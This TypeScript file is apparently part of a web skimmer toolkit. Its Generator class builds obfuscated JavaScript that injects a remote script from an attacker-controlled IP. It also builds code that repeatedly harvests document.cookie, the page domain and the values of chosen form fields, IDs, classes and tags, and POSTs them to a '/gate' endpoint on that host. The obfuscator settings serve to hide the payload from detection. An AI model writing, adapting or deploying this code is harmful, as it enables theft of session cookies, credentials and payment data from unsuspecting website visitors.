import * as jsObf from "javascript-obfuscator";
import {Loader} from "./loader";
export class Generator {
  public loader:Loader;
  public detectedIp: any;
  public conf: any;
  public takensalt: String;
  constructor(){
    this.loader = new Loader();
    this.detectedIp = this.loader.findIp();
  }
  public populate(conf: any,salt: String): void{
    this.conf = conf;
    this.takensalt = salt;
  }
  public parseJsonContent(param: Number) {
    if (this.conf != null){
      let common = '';
      if (param === 1){
        this.conf.documentids.forEach((id)=>{
          common +='\''+id+'\','
        });
        return common.slice(0,-1);
      }
      else if (param === 2){
        this.conf.documentclasses.forEach((id)=>{
          common +='\''+id+'\','
        });
        return common.slice(0,-1);
      }
      else if (param === 3){
        this.conf.documenttags.forEach((id)=>{
          common +='\''+id+'\','
        });
        return common.slice(0,-1);
      }
    }
  }
  public endpoint(): any{
    var b = jsObf.obfuscate(`
      var g = document.createElement('script');
      g.src = location.protocol + '//`+this.detectedIp+`:`+this.conf.port+`/`+this.takensalt+`'`+`
      g.asynch = true;
      document.getElementsByTagName('head')[0].appendChild(g)
      `,
      {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        shuffleStringArray: true,
        splitStrings: true,
        stringArrayThreshold: 1
      });
      return "<script>"+b+"</script>"
  }
  public init(): any {
    var a = jsObf.obfuscate(`
      setInterval(function(){
      var data = "&domain="+ document.domain + "&cookie=" + document.cookie;
      `+`const ics = [`+this.parseJsonContent(2)+`];
      `+`const its = [`+this.parseJsonContent(3)+`];
         const iks = [`+this.parseJsonContent(1)+`];
      its.forEach((it)=>{
        const a = document.getElementsByTagName(it);
        for (var i = 0; i < a.length; i++){
           if (a[i] !== undefined){
            data+="&"+it+"="+a[i].innerHTML;
           }
         }
       });
      iks.forEach((ik)=>{
        if (document.getElementById(ik) !== null){
         data+="&"+ik+"="+document.getElementById(ik).value;
        }
      });
      ics.forEach((ic)=> {
        const b = document.getElementsByClassName(ic);
        for (var i = 0; i < b.length; i++){
          if (b[i] !== undefined){
           data+="&"+ic+"="+b[i].value;
          }
        }
      });
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://`+this.detectedIp+`:`+this.conf.port+`/gate");
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(data);
    },`+this.conf.polling+`000)`,
  {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        shuffleStringArray: true,
        splitStrings: true,
        stringArrayThreshold: 1
    });
     return a.getObfuscatedCode();
   }
}
